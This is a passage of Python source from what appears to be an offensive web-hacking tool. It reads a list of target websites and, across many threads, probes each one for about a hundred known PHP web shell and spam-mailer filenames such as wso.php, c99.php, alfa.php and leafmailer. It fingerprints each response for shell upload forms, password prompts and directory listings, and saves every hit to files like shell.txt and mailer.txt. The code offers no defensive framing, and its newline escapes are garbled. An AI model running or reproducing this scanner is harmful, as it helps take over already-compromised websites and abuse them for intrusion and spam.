            'wp-configer.php',
            'alfa.php',
            'wso.php',
            'c.php',
            '1.php',
            'send.php',
            '3.php',
            '404.php',
            'sym.php',
            'wp-confirm.php',
            'images/vuln.php',
            'dr.php',
            'upload.php',
            'bypass.php',
            'wp-blog.php',
            'data.php',
            'owl.php',
            'vuln.php',
            'symlink.php',
            'ohayo.php',
            '100.php',
            '777.php',
            'wp-content/wp-logins.php',
            '1index.php',
            'wp-wso.php',
            '2index.php',
            'wp-content/wp-admin.php',
            'wp-configer.php',
            'wp-admin.php',
            'mini.php',
            'old-index.php',
            'doc.php',
            'ups.php',
            'shx.php',
            'FoxWSO.php',
            'x.php',
            'cms.php',
            'stindex.php',
            'wp-uploads.php',
            'autoload_classmap.php',
            'Gel.php',
            'defau1t.php',
            '0byte.php',
            'wp.php',
            '41.php',
            'media-admin.php',
            '4price.php',
            'MARIJUANA.php',
            'marijuana.php',
            'f.php',
            '.fk.php',
            'wikindex.php',
            'xox.php',
            'o.php',
            'new.php',
            '3index.php',
            'sindex.php',
            'baindex.php',
            'new-index.php',
            'wi.php',
            'XxX.php',
            'mar.php',
            'root.php',
            '11index.php',
            'wp-login.php',
            'nee.php',
            'v.php',
            'z.php',
            'xx.php',
            'g.php',
            'm.php',
            'shell.php',
            'sh3ll.php',
            'c99.php',
            'alexuse.php',
            'w.php',
            'ws.php',
            '2.php',
            'lol.php',
            '87.php',
            '7yn.php',
            'wp-content/marijuana.php',
            'haxor.php',
            '403.php',
            '13.php',
            'wp-content/plugins/xwp/up.php',
            'cpanel.php', 'upload/fw']
                for script in listaa:
                    if not i.startswith("http"): 
                        i = "http://" + i
                    url =  i + '/' + script
                    while True:
                        req_first = x.get(url, headers=head)
                        if 'drwxr-xr-x' in req_first.text or '-rw-r--r--' in req_first.text or 'drwxr-x---' in req_first.text:
                            Good = Good + 1 
                            print(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.GREEN} Found Shell {Fore.WHITE}| {Fore.YELLOW}{url}')
                            with open('AdjustableSpanner/shell.txt', 'a') as (file):
                                file.write(url + 'n')
                                file.close()
                            break
                        elif '<span>Upload file:' in req_first.text :
                            Good = Good + 1
                            print(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.GREEN} Found Upload File {Fore.WHITE}| {Fore.YELLOW}{url}')
                            with open('AdjustableSpanner/uploader-shell.txt', 'a') as (gn):
                                gn.write(url + 'n')
                                gn.close()
                            break
                        elif 'type="submit" id="_upl" value="Upload">' in req_first.text:
                            Good = Good + 1
                            print(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.GREEN} Found Shell {Fore.WHITE}| {Fore.YELLOW}{url}')
                            with open('AdjustableSpanner/shell.txt', 'a') as (fox):
                                Good = Good + 1
                                fox.write(url + 'n')
                                fox.close()
                            break
                        elif 'Leaf PHPMailer' in req_first.text or '>alexusMailer 2.0<' in req_first.text:
                            mailer = mailer + 1
                            print(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.GREEN} Found Mailer {Fore.WHITE}| {Fore.YELLOW}{url}')
                            with open('AdjustableSpanner/mailer.txt', 'a') as (mailers):
                                mailers.write(url + 'n')
                                mailers.close()
                            break
                        else:
                            if 'method=post>Password:' in req_first.text or '<input type=password name=pass' in req_first.text:
                                password = password + 1
                                print(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.GREEN} Found Pass Shell {Fore.WHITE}| {Fore.YELLOW}{url}')
                                with open('AdjustableSpanner/user-pass.txt', 'a') as (pa):
                                    pa.write(url + 'n')
                                    pa.close()
                                break
                            else:
                                if 'name="uploader" id="uploader">' in req_first.text:
                                    good = good + 1
                                    print(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.GREEN} Found Uploader  {Fore.WHITE}| {Fore.YELLOW}{url}')
                                    print('{} [#] VULN PAGE : >>{}'.format(fy, url))
                                    with open('AdjustableSpanner/vuln-uploader.txt', 'a') as (fo):
                                        fo.write(url + 'n')
                                        fo.close()
                                    break
                                else:
                                    Bad = Bad + 1
                                    print(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.RED} | NOT VULN {Fore.WHITE}| {Fore.YELLOW}{url}')
                                    break
                                    
                        

            except:
                pass


        def run():
            fr = Fore.RED
            gr = Fore.BLUE
            fc = Fore.CYAN
            fw = Fore.WHITE
            fy = Fore.YELLOW
            fg = Fore.GREEN
            sd = Style.DIM
            sn = Style.NORMAL
            sb = Style.BRIGHT
            global listaa
            os.system(["clear", "cls"][os.name == 'nt'])
            for line in logo.splitlines():
                print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
                time.sleep(0.05)  
            file_name = input(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE} Websites List > ')
            op = open(file_name, 'r', encoding="utf8" , errors='ignore').read().splitlines()
            TEXTList = [list.strip() for list in op]
            listaa = ['x.php', 'alfa.php', 'c99.php', 'mini.php', 'a.php', 'wso.php', 'home.php', 'shell.php', 'leaf.php', 'wp-admin.php', 'leafmailer2.8.php', 'wso.php', 'a.php', 'leaf.php',
            'alex.php',
            'mailer.php',
            'anone.php',
            'a.php',
            'wp-configer.php',
            'alfa.php',
            'wso.php',
            'c.php',
            '1.php',
            'send.php',
            '3.php',
            '404.php',
            'sym.php',
            'wp-confirm.php',
            'images/vuln.php',
            'dr.php',
            'upload.php',
            'bypass.php',
            'wp-blog.php',
            'data.php',
            'owl.php',
            'vuln.php',
            'symlink.php',
            'ohayo.php',
            '100.php',
            '777.php',
            'wp-content/wp-logins.php',
            '1index.php',
            'wp-wso.php',
            '2index.php',
            'wp-content/wp-admin.php',
            'wp-configer.php',
            'wp-admin.php',
            'mini.php',
            'old-index.php',
            'doc.php',
            'ups.php',
            'shx.php',
            'FoxWSO.php',
            'x.php',
            'cms.php',
            'stindex.php',
            'wp-uploads.php',
            'autoload_classmap.php',
            'Gel.php',
            'defau1t.php',
            '0byte.php',
            'wp.php',
            '41.php',
            'media-admin.php',
            '4price.php',
            'MARIJUANA.php',
            'f.php',
            '.fk.php',
            'wikindex.php',
            'xox.php',
            'o.php',
            'new.php',
            '3index.php',
            'sindex.php',
            'baindex.php',
            'new-index.php',
            'wi.php',
            'XxX.php',
            'mar.php',
            'root.php',
            '11index.php',
            'wp-login.php',
            'nee.php',
            'v.php',
            'z.php',
            'xx.php',
            'g.php',
            'm.php',
            'shell.php',
            'sh3ll.php',
            'c99.php',
            'alexuse.php',
            'w.php',
            'ws.php',
            '2.php',
            'lol.php',
            '87.php',
            '7yn.php',
            'haxor.php',
            '403.php',
            '13.php',
            'cpanel.php', 'upload/fw']
            p = Pool(int(input(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE} Thread > ')))
            p.map(finder, TEXTList)
        run()
    else:
        print("n"+"Wrong Input")

bl = Fore.BLUE
wh = Fore.WHITE
gr = Fore.GREEN
bgr = Back.GREEN
RED = Fore.RED
sres = Style.RESET_ALL
bred = Back.RED
F = Fore

def center(var:str, space:int=None): # From Pycenter
    if not space:
        space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2
    
    return "n".join((' ' * int(space)) + var for var in var.splitlines())  

if __name__ == '__main__':
    main()